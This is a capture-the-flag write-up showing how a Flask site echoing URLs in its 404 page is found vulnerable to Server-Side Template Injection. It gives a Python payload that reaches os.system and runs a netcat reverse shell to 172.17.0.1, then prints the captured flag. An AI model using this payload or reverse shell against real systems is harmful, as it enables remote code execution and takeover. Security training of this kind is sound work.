# Paths

One of the bullet points on the homepage of the website says "Fix URL Issue". If we start plugging in random URLs, we might be able to notice that our URL is echo'd back to us:

```
http://localhost:7500/abcd
404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
```

A common vulnerability with templated websites is called Server-Side Template Injection (SSTI). SSTI can easily be tested with the string {{ 7 * '7' }}. A request to http://localhost:7500/{{ 7 * '7' }} returns:

```
http://localhost:7500/7777777
404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
```

Based on the response, this indicates that the service is a Flask application that is vulnerable to SSTI. We can abuse this to get arbitrary code execution.

By traversing internal python classes, we can import os and call system on "nc 172.17.0.1 1337 -e sh" to pop a shell.

```Python
injection  = '''{{ ''.__class__.mro()[1].__subclasses__()[0][0]'''
injection += '''.__init__.__globals__['__builtins__']['__import__']'''
injection += '''('os').system("nc 172.17.0.1 1337 -e sh") }}'''
r = requests.get(f"http://{HOST}:{PORT}/" + injection)
```

Catching the callback:

```
Connection from 172.17.0.2:33465
cat flag.txt
CUCTF{SSTI_m4k35_E4sy_c0d3_3x3c}
```
